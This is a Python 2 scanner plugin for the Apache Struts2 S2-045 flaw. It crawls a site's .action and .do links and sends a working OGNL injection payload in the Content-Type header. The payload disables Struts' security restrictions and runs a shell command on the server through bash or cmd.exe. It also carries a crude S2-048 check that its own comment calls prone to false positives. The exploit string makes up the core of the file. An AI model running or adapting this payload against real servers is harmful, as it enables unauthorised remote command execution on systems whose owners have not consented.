# coding:utf-8
import urllib2
import httplib
import logging
import re
import urlparse
import HTMLParser
import random

from lib.config import (
    PASSWORD_DIC, TIME_OUT, MY_PROXY, USER_AGENT_LIST
)

def get_plugin_info():
    return {
        "name": "st2-045",
        "info": "S2_045远程代码执行",
        "Author":"Jaqen",
        "Create_date":"2017-10-01",
    }
def get_url(domain, timeout):
    url_list = []
    try:
        res = urllib2.urlopen(domain, timeout=timeout)
        html = res.read()
    except Exception, e:
        return
    root_url = res.geturl()
    m = re.findall("<a[^>]*?href=('|\")(.*?)\\1", html, re.I)
    if m:
        for url in m:
            ParseResult = urlparse.urlparse(url[1])
            if ParseResult.netloc and ParseResult.scheme:
                if domain == ParseResult.hostname:
                    url_list.append(HTMLParser.HTMLParser().unescape(url[1]))
            elif not ParseResult.netloc and not ParseResult.scheme:
                url_list.append(HTMLParser.HTMLParser().unescape(urlparse.urljoin(root_url, url[1])))
    return list(set(url_list))

def exploit(ip):
    result = []
    if FindDomain_flag != 'n':
        if Domain:
            for domain in Domain:
                url_list = get_url(domain, TIME_OUT)
                if url_list:
                    for url in url_list:
                        if re.search("\.action|\.do", url):
                            data ="test"
                            payload = "%{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='echo available').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}"
                            headers = {'content-type': payload,'User-Agent':random.choice(USER_AGENT_LIST)}
                            try:
                                httplib.HTTPConnection._http_vsn = 10
                                httplib.HTTPConnection._http_vsn_str = 'HTTP/1.0'
                                request = urllib2.Request(url,data,headers)
                                response = urllib2.urlopen(request,timeout=TIME_OUT)
                                if 'available' in response.read():
                                    result.append(url+" >>>> 存在S2_045代码执行漏洞")
                                    break
                                else:
                                    pass
                            except Exception, e:
                                logging.error(e)
                        else:
                            pass
                url = "%s/struts2-showcase/"%domain
                try:
                    response = urllib2.urlopen(url,timeout=TIME_OUT)
                    if response.getcode() != 404:#这个判断太简单 误报太高
                        result.append(url+" >>>> 存在S2_048代码执行漏洞")
                except Exception, e:
                    logging.error(e)
            if len(result):
                return result
